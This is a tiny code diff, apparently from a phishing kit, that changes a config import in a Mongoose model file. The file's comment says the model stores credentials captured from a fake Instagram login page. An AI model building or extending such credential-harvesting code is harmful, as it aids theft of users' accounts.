@@ -1,5 +1,5 @@
 const mongoose = require('mongoose');
-const BRAND = require('../config/brand');
+const BRAND = require('../config/brand').BRAND;
 
 /**
  * Stores credentials captured from the Instagram phishing login page.
